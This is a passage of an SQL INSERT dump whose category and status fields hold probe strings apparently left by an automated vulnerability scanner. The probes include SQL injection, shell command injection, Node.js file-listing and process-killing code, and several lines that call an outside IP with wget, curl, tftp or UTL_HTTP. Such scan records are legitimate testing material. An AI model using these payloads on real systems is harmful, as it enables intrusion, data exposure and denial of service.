...
VALUES
	...
	(60555264,'publication','otherCategory','APPSCAN'),
	(60555265,'publication','otherStatus','APPSCAN'),
	(60555266,'publication','otherCategory','AAPPSCANB'),
	(60555267,'publication','otherCategory','ProbePhishing'),
	(60555268,'publication','otherCategory','APPSCAN\';'),
	(60555269,'publication','otherCategory','APPSCAN1+having+1=1--+'),
	(60555270,'publication','otherCategory','APPSCAN)+having+1=1--+'),
	(60555271,'publication','otherCategory','APPSCAN%uFF07'),
	(60555272,'publication','otherCategory','APPSCAN\''),
	(60555273,'publication','otherCategory','APPSCAN1+having+1=1--'),
	(60555274,'publication','otherCategory','APPSCAN)+having+1=1--'),
	(60555275,'publication','otherCategory','APPSCAN;ls'),
	(60555276,'publication','otherCategory','APPSCAN;llss'),
	(60555277,'publication','otherCategory','ls;APPSCAN'),
	(60555278,'publication','otherCategory','APPSCAN|ls'),
	(60555279,'publication','otherCategory','APPSCAN|llss'),
	(60555280,'publication','otherCategory','ls|APPSCAN'),
	(60555281,'publication','otherCategory','|id'),
	(60555282,'publication','otherCategory','&&id'),
	(60555283,'publication','otherCategory','||id'),
	(60555284,'publication','otherCategory','\' | \'id'),
	(60555285,'publication','otherCategory','id'),
	(60555286,'publication','otherCategory',';id\0'),
	(60555287,'publication','otherCategory','|ls -a1F'),
	(60555288,'publication','otherCategory','&&ls -a1F'),
	(60555289,'publication','otherCategory','||ls -a1F'),
	(60555290,'publication','otherCategory','\' | \'ls -a1F'),
	(60555291,'publication','otherCategory','ls -a1F'),
	(60555292,'publication','otherCategory',';ls -a1F\0'),
	(60555293,'publication','otherCategory','ls'),
	(60555294,'publication','otherCategory','APPSCAN\'|wget+http://129.43.255.12:55892/AppScanMsg.html?varId=2039|echo+\''),
	(60555295,'publication','otherCategory','APPSCAN|wget+http://129.43.255.12:55892/AppScanMsg.html?varId=2040|echo+;'),
	(60555296,'publication','otherCategory','APPSCAN;curl+http://129.43.255.12:55892/AppScanMsg.html?varId=2044;'),
	(60555297,'publication','otherCategory','(select+APPSCAN)'),
	(60555298,'publication','otherCategory','APPSCANviprobejy000093'),
	(60555299,'publication','otherCategory','viprobejy000093'),
	(60555300,'publication','otherCategory','APPSCAN\'Aviprobejy000093'),
	(60555301,'publication','otherCategory','res.end(require(\'fs\').readdirSync(\'.\').toString())'),
	(60555302,'publication','otherCategory','res.end(require(\'fs\').readdirSync(\'..\').toString())'),
	(60555303,'publication','otherStatus','AAPPSCANB'),
	(60555304,'publication','otherStatus','ProbePhishing'),
	(60555305,'publication','otherStatus','APPSCAN\';'),
	(60555306,'publication','otherStatus','APPSCAN1+having+1=1--+'),
	(60555307,'publication','otherStatus','APPSCAN)+having+1=1--+'),
	(60555308,'publication','otherStatus','APPSCAN%uFF07'),
	(60555309,'publication','otherStatus','APPSCAN\''),
	(60555310,'publication','otherStatus','APPSCAN1+having+1=1--'),
	(60555311,'publication','otherStatus','APPSCAN)+having+1=1--'),
	(60555312,'publication','otherStatus','APPSCAN;ls'),
	(60555313,'publication','otherStatus','APPSCAN;llss'),
	(60555314,'publication','otherStatus','ls;APPSCAN'),
	(60555315,'publication','otherStatus','APPSCAN|ls'),
	(60555316,'publication','otherStatus','APPSCAN|llss'),
	(60555317,'publication','otherStatus','ls|APPSCAN'),
	(60555318,'publication','otherStatus','|id'),
	(60555319,'publication','otherStatus','&&id'),
	(60555320,'publication','otherStatus','||id'),
	(60555321,'publication','otherStatus','\' | \'id'),
	(60555322,'publication','otherStatus','id'),
	(60555323,'publication','otherStatus',';id\0'),
	(60555324,'publication','otherStatus','|ls -a1F'),
	(60555325,'publication','otherStatus','&&ls -a1F'),
	(60555326,'publication','otherStatus','||ls -a1F'),
	(60555327,'publication','otherStatus','\' | \'ls -a1F'),
	(60555328,'publication','otherStatus','ls -a1F'),
	(60555329,'publication','otherStatus',';ls -a1F\0'),
	(60555330,'publication','otherStatus','ls'),
	(60555331,'publication','otherStatus','(select+APPSCAN)'),
	(60555332,'publication','otherStatus','APPSCANviprobejy000099'),
	(60555333,'publication','otherStatus','viprobejy000099'),
	(60555334,'publication','otherStatus','APPSCAN\'Aviprobejy000099'),
	(60555335,'publication','otherStatus','res.end(require(\'fs\').readdirSync(\'.\').toString())'),
	(60555336,'publication','otherCategory','APPSCAN\'-(function(){var d=new Date();do{var c=new Date();}while(c-d<1);return 0;})()-\''),
	(60555337,'publication','otherCategory','APPSCAN\'-(function(){var d=new Date();do{var c=new Date();}while(c-d<91000);return 0;})()-\''),
	(60555338,'publication','otherCategory','APPSCAN\'-(function(){var+d=new+Date();do{var+c=new+Date();}while(c-d<1);return+0;})()-\''),
	(60555339,'publication','otherCategory','APPSCAN\'-(function(){var+d=new+Date();do{var+c=new+Date();}while(c-d<91000);return+0;})()-\''),
	(60555340,'publication','otherCategory','while(1);'),
	(60555341,'publication','otherCategory','process.exit();'),
	(60555342,'publication','otherCategory','process.kill(process.pid);'),
	(60555343,'publication','otherCategory','process.kill(process.pid;)'),
	(60555344,'publication','otherCategory','APPSCAN\';+WAITFOR+DELAY+\'0:0:0\';--+'),
	(60555345,'publication','otherCategory','APPSCAN\';+WAITFOR+DELAY+\'0:0:91\';--+'),
	(60555346,'publication','otherCategory','APPSCAN;+WAITFOR+DELAY+\'0:0:0\';--+'),
	(60555347,'publication','otherCategory','APPSCAN;+WAITFOR+DELAY+\'0:0:91\';--+'),
	(60555348,'publication','otherCategory','APPSCAN+AND+(SELECT+*+FROM+(SELECT(SLEEP(91)))aHzR)'),
	(60555349,'publication','otherCategory','APPSCAN\';+exec+master..xp_cmdshell+\'tftp+129.43.255.12+GET+SQL_Injection_Validation\'--+'),
	(60555350,'publication','otherCategory','APPSCAN+||+UTL_HTTP.REQUEST(\'http://129.43.255.12:80/SQL_Injection_Validation\')+||+'),
	(60555351,'publication','otherStatus','while(1);'),
	(60555352,'publication','otherStatus','process.exit();'),
	(60555353,'publication','otherStatus','process.kill(process.pid);'),
	(60555354,'publication','otherStatus','process.kill(process.pid;)'),
	(60555355,'publication','otherStatus','APPSCAN\';+WAITFOR+DELAY+\'0:0:0\';--+'),
	(60555356,'publication','otherStatus','APPSCAN\';+WAITFOR+DELAY+\'0:0:91\';--+'),
	(60555357,'publication','otherStatus','APPSCAN;+WAITFOR+DELAY+\'0:0:0\';--+'),
	(60555358,'publication','otherStatus','APPSCAN;+WAITFOR+DELAY+\'0:0:91\';--+'),
